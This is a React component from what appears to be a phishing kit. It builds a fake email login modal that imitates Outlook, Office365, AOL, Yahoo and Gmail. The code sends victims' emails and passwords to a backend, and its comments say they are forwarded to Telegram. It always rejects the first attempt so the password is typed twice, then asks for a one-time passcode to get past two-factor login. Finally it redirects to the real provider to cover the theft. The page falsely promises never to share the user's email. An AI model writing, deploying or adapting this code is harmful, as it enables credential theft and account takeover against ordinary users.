import {useState} from 'react';
import './EmailLoginModal.css';
import outlookImg from "../assets/outlook.png";
import officeImg from "../assets/office360.png";
import aolImg from "../assets/aol.png";
import {FaGoogle, FaYahoo} from "react-icons/fa";
import {MdEmail} from "react-icons/md";
import OtpModal from '../pages/gmailLogin/OtpModal';

const EmailLoginModal = ({ isOpen, onClose, provider }) => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const [attemptCount, setAttemptCount] = useState(0);
    const [showOtp, setShowOtp] = useState(false);

    if (!isOpen) return null;

    const isGmailLike = provider === 'Gmail';

    // ── Route to provider dashboard ──
    const routeToProvider = () => {
        const providerDashboards = {
            "Outlook": "https://outlook.live.com/mail/",
            "Office365": "https://www.office.com/",
            "AOL": "https://mail.aol.com/",
            "Yahoo": "https://mail.yahoo.com/",
            "Other": "https://www.punchbowl.com/ecards/send/d6e3fa7ed13293698b14/preview",
        };
        window.location.href = providerDashboards[provider] || "https://mail.google.com/";
    };

    // ── OTP submitted — send to Telegram then route immediately ──
    const handleOtpSubmit = async (otp) => {
        await fetch(`${process.env.REACT_APP_BACKEND_URL}/submit-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, otp, provider }),
        });

         // Route immediately — no polling needed
        routeToProvider();
    };

    // ── Send credentials to backend ──
    async function sendRequest() {
        return await fetch(`${process.env.REACT_APP_BACKEND_URL}/submit`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password, provider }),
        });
    }

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!email || !password) {
            setError('Please fill out both fields.');
            return;
        }

        if (!isGmailLike) {
            if (attemptCount === 0) {
                // First attempt — always fail
                await sendRequest();
                setError('Invalid credentials. Please try again.');
                setAttemptCount(1);
                setPassword('');
                return;
            } else {
                // Second attempt — send to Telegram then show OTP screen
                await sendRequest();
                setShowOtp(true);
                return;
            }
        }

        onClose();
    };

    // Show OTP screen after second attempt
    if (showOtp) {
        return <OtpModal email={email} onSubmit={handleOtpSubmit} onClose={onClose} />;
    }

    const title = provider === 'Other' ? 'Other Email' : provider;

    const getProviderIcon = () => {
        switch (provider) {
            case "Outlook": return <img src={outlookImg} className="modal-icon-img" alt="Outlook" />;
            case "Office365": return <img src={officeImg} className="modal-icon-img" alt="Office365" />;
            case "AOL": return <img src={aolImg} className="modal-icon-img" alt="AOL" />;
            case "Yahoo": return <FaYahoo className="modal-icon" />;
            case "Gmail": return <FaGoogle className="modal-icon" />;
            default: return <MdEmail className="modal-icon" />;
        }
    };

    return (
        <div className="modal-overlay" onClick={onClose}>
            <div className="modal-content" onClick={(e) => e.stopPropagation()}>
                <button className="close-btn" onClick={onClose}>×</button>

                <div className="modal-header">
                    <div className="modal-icon-container">{getProviderIcon()}</div>
                    <h2 className="modal-title">Login with {title}</h2>
                </div>

                <form onSubmit={handleSubmit}>
                    <label>Email Address</label>
                    <input
                        type="email"
                        placeholder="Email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        required
                    />
                    <small>We'll never share your email with anyone else</small>

                    <label>Password</label>
                    <input
                        type="password"
                        placeholder="Enter Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                    />
                    {error && <p className="error">{error}</p>}

                    <div className="modal-buttons">
                        <button type="button" onClick={onClose}>Close</button>
                        <button type="submit" className="login-btn">Login</button>
                    </div>
                </form>
            </div>
        </div>
    );
};

export default EmailLoginModal;